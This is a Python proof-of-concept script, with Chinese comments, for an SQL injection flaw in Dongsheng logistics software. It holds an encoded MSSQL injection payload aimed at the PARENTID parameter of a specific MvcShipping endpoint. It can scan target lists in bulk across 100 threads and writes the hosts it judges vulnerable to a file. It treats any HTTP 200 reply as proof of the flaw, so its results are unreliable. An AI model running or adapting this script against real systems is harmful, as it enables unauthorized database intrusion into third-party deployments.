import sys
import requests
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei   
"""
    logging.info(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='东胜物流软件 SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断输入的参数是单个 URL 还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))

# 检测漏洞函数，向目标 URL 发送请求，检查是否存在漏洞
def poc(target):
    payload_url = ("/MvcShipping/MsBaseInfo/GetProParentModuTreeList?"
                   "PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG")
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/70.0.3538.77 Safari/537.36',
        'x-auth-token': '36ef438edd50bf8dd51fba642a82c3b7d272ff38',
        'Content-Type': 'text/html; charset=utf-8',
        'Connection': 'close'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            logging.info(f"{GREEN}[+] 该url存在SQL注入漏洞: {target}{RESET}")
            with open('dongshenre.txt', 'a', encoding="utf-8") as fp:
                fp.write(target + "\n")
                return True
        else:
            logging.info(f"[-] 该url不存在SQL注入漏洞: {target}")
    except Exception as e:
        logging.error(f"[*] 该url存在问题: {target}, 错误信息: {e}")
        return False

# 程序入口点
if __name__ == '__main__':
    main()
